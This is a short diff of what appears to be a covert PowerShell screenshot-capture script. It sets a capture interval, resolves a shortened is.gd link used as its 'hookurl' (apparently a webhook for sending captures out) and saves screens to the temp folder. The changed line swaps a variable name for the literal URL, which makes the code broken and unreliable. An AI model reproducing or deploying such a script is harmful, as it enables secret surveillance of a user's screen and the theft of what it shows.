@@ -3,7 +3,7 @@ $seconds = 2 # Screenshot interval
 $a = 1 # Sceenshot amount
 
 # shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "https://is.gd/xSsigk" ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Ln -ne 121){Write-Host "https://is.gd/xSsigk" ; https://is.gd/xSsigk = (irm https://is.gd/xSsigk).url}
 
 While ($a -gt 0){
 $Filett = "$env:temp\SC.png"
